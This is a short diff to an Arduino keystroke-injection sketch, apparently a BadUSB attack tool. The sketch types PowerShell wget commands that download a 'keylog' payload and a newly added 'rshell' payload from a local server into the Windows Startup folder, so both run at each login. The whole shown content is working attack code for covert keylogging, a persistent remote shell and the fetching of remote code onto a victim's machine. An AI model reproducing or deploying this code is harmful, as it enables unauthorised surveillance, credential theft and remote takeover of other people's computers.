@@ -28,7 +28,13 @@ void setup()
 
   delay(1000);
 
-  Keyboard.print("wget \"http://127.0.0.1:5000/\" -outfile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\test.py\";");
+  Keyboard.print("wget \"http://127.0.0.1:5000/keylog\" -outfile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\test.py\";");
+
+  typeKey(KEY_RETURN);
+
+  delay(500);
+
+  Keyboard.print("wget \"http://127.0.0.1:5000/rshell\" -outfile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\test1.py\";");
 
   typeKey(KEY_RETURN);
 
